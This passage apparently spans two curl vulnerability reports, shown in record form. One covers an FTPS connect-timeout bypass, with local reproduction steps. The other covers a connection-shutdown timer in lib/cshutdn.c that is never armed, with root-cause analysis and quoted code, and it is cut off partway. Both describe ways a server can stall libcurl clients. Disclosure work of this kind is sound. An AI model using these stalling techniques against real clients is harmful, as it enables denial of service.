curl 8.23.0 built from the curl-8_23_0 tag (3163ec0656) on Linux x86_64 with OpenSSL 3.6.4, --enable-debug. By the commit it is 8.19.0 through 8.23.0; curl-8_18_0 built the same way is not affected. curl -V: curl 8.23.0-DEV (x86_64-pc-linux-gnu) libcurl/8.23.0-DEV OpenSSL/3.6.4 zlib/1.3.2 brotli/1.2.0 zstd/1.5.7 libidn2/2.3.8 libpsl/0.23.3 nghttp2/1.70.0 OpenLDAP/2.6.14

## Steps To Reproduce:
1. In one dir: openssl req -x509 -newkey rsa:2048 -nodes -keyout key.pem -out cert.pem -days 3 -subj '/CN=127.0.0.1' -addext 'subjectAltName=IP:127.0.0.1'
2. python3 ftps_stall.py 8322 --implicit --delay150 1.5 (from the attachment; it logs every command and "data conn accepted, holding without handshake" when the ClientHello arrives)
3. timeout 30 curl --connect-timeout 2 --cacert cert.pem -o /dev/null ftps://127.0.0.1:8322/file ; echo $?  -> 124 after 30 s on 8.23.0, "curl: (28) connect timeout" after 2 s on 8.18.0
4. Control: the same with -m 5 instead of --connect-timeout 2 -> "curl: (28) connect timeout" at 5 s on 8.23.0, so the wait is that blocking loop and only the total timeout reaches it
5. Multi: python3 slow_http.py 8325 3, build multi_starve.c against libcurl, then timeout 30 ./multi_starve ftps://127.0.0.1:8322/file http://127.0.0.1:8325/ cert.pem 2 -> on 8.23.0 the output stops after "1.05s http handle added" and the process is killed at 30 s; swap in ftps_stall.py 8324 --plain --delay150 1.5 and ftp://127.0.0.1:8324/file and the http transfer completes at 4 s
6. Apply fix-conn-connect-blocking-ctimeout.patch to 8.23.0, rebuild, repeat 3 and 5 -> "connect timeout" at 3.6 s (the fixture's 1.5 s plus the 2 s connect timeout counted from the start of the wait), the multi program finishes both transfers with the longest perform call at 2.0 s

## Impact

## Summary:
A server, or anything that can hold the data connection open without completing TLS, stops the whole multi handle for as long as it likes: no transfer on that handle makes progress, the documented counter-measures for a connect that never completes (CURLOPT_CONNECTTIMEOUT, default 300 s) and for a silent server (CURLOPT_SERVER_RESPONSE_TIMEOUT) do nothing, and only an application-set total timeout gets it back. This is the same class as CVE-2026-92387, the timeout mechanism is bypassed and all concurrent transfers on the multi are blocked, it needs no option set, it hits the plain ftps:// scheme in passive mode which is the default, and 8.18.0 enforced the bound that 8.19.0 dropped.

title: curl EXPIRE_SHUTDOWN timer never armed for silent servers: connection-shutdown timeout bypass in cshutdn (event-driven mode)
vulnerability_information:
## Summary

curl's non-blocking connection shutdown machinery (`lib/cshutdn.c`) is supposed to enforce a 2-second shutdown timeout (`DEFAULT_SHUTDOWN_TIMEOUT_MS`) on connections whose peer never answers the graceful shutdown. In `curl_multi_socket_action()` event-driven mode the machinery deadlocks: the only code that arms the admin handle's `EXPIRE_SHUTDOWN` timer is `cshutdn_perform()`, and `cshutdn_perform()` is only invoked from the multi's processing of the admin handle, which only happens when the admin is woken by a timer or by socket I/O. When a connection enters shutdown, the timer is deliberately not armed for the admin handle (`if(data->mid)` in `Curl_cshutdn_start_timer()`), and `Curl_cshutdn_add()` neither arms a timer nor marks the admin dirty. A server that completes the request normally but then goes silent (no TLS `close-notify`, no FTP `QUIT` reply, TCP still open) it generates no socket I/O either. So nothing ever schedules `cshutdn_perform()`: the code that would arm the wakeup timer can only run after the wakeup has already happened. The 2-second timeout is never evaluated and the connection lingers with its socket and file descriptor open until the application itself drives the multi again (in the reproduction, only `curl_multi_cleanup()`).

This is harmless in `curl_multi_perform()` polling mode, where the admin handle is unconditionally processed every call and the shutdown-timeout check is eventually reached. In event-driven mode, a malicious server that withholds its close response while keeping the TCP session open defeats the timeout entirely. Repeating this against a multi-socket client accumulates connections (memory + file descriptors) for as long as the attacker keeps the TCP sessions open.

| Variant | Interface | Server behavior | EXPIRE_SHUTDOWN armed? | Shutdown-timeout (2s) enforced? | Observed linger |
| --- | --- | --- | --- | --- | --- |
| Polling mode (control) | `curl_multi_perform` | withholds close-notify | no, but irrelevant | yes (admin processed every call) | cleared within ~2s |
| Event-driven mode (vulnerable) | `curl_multi_socket_action` | withholds close-notify | **no** | **no** | >15s, only cleared at `curl_multi_cleanup()` |
| Event-driven mode | `curl_multi_socket_action` | sends close-notify normally | no | n/a (shutdown completes via I/O) | clears promptly |

## Affected versions

- curl 8.21.0-DEV (OpenSSL/3.5.5, c-ares/1.34.6, debug build).
- curl master `9b2caf3` (8.22.0-DEV, verified 2026-08-31).
- Current master `5d4eaac8f` (8.23.1-DEV, verified 2026-10-18). **Still affected, including after the 8.23.0 `cshutdn` refactor** ("cshutdown: make it smaller" / "use ptrarray instead of llist"). The harness was re-run against a libcurl built from current master: 10 of 10 transfers complete, then all 10 connections linger for the full 15-second observation window, the process FD count rises from 6 to 16 and stays there, **zero `EXPIRE_SHUTDOWN` timers are ever armed** (`Shutdown-range timers (1-2000ms): 0`), and the connections are only force-closed during `curl_multi_cleanup()`. For contrast, the same harness against the system curl 7.81.0 (pre-`cshutdn` implementation) shows 5 shutdown-range timers armed and 0 lingering connections: the older implementation cleans these connections up, the current one does not.

Note: the 8.23.0 refactor already fixed the `next_expire_ms` accumulator pattern inside `cshutdn_perform()` (the first-assignment clause is present on current master). That fix does not change the behavior, because in this scenario `cshutdn_perform()` is never invoked at all (see Root cause).

## Root cause

Three pieces of the current shutdown machinery interact (code quoted from `5d4eaac8f`):

1. When a connection enters shutdown, the timeout state is stored on the connection, but the timer is not armed for the admin handle:

```c
// lib/cshutdn.c (Curl_cshutdn_start_timer)
conn->shutdown.start_ms[sockindex] = curlx_ptimediff_ms(pnow, &conn->created);
conn->shutdown.timeout_ms = ... : DEFAULT_SHUTDOWN_TIMEOUT_MS;   /* 2000 */
/* Set a timer, unless we operate on the admin handle */
if(data->mid)
    Curl_expire_set(data, EXPIRE_SHUTDOWN, conn->shutdown.timeout_ms, pnow);
```
